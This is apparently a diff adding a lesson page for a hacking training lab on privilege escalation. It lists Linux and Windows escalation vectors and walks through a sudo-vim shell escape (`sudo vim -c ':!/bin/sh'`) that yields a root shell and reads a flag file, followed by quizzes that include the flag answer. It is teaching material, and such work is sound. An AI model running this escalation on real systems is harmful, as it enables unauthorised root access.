@@ -1,0 +1,63 @@
+# Privilege Escalation
+
+Getting a shell is just the beginning. 
+If you are `www-data` or `user`, you are limited. 
+You need to become `root` or `Administrator`.
+
+## Linux PrivEsc
+
+Common vectors:
+1.  **Kernel Exploits:** DirtyCow, PwnKit.
+2.  **SUID Binaries:** Programs ensuring root rights (`chmod u+s`).
+3.  **Sudo Rights:** `sudo -l` (What can I run as root?).
+4.  **Cron Jobs:** Scripts running automatically by root.
+
+## Windows PrivEsc
+
+Common vectors:
+1.  **Service Permissions:** Modifying a binary run by SYSTEM.
+2.  **Unquoted Service Paths:** `C:\Program Files\My Service\service.exe`.
+3.  **AlwaysInstallElevated:** Registry key allowing MSI installs as SYSTEM.
+
+## Lab: Sudo Abuse
+
+You have checking access. Run `sudo -l`.
+
+<TerminalWindow 
+  cmd="sudo -l" 
+  output="User user may run the following commands on breachlabs:
+    (root) NOPASSWD: /usr/bin/vim" 
+/>
+
+The user can run `vim` as root without a password.
+Vim has a shell escape feature.
+
+Command: `sudo vim -c ':!/bin/sh'`
+
+<TerminalWindow 
+  cmd="sudo vim -c ':!/bin/sh'" 
+  output="# whoami
+root
+# cat /root/root.txt
+Flag: BL{Sud0_Vim_Escap3}" 
+/>
+
+<Quiz 
+  question="What command lists the commands a user can run with sudo?"
+  options={[
+    "sudo -l",
+    "sudo -s",
+    "sudo --admin",
+    "cat /etc/sudoers"
+  ]}
+/>
+
+<Quiz 
+  question="What is the flag found after identifying the misconfiguration?"
+  options={[
+    "BL{Sud0_Vim_Escap3}",
+    "BL{Dirty_C0w}",
+    "BL{Root_Acc3ss}",
+    "root"
+  ]}
+/>
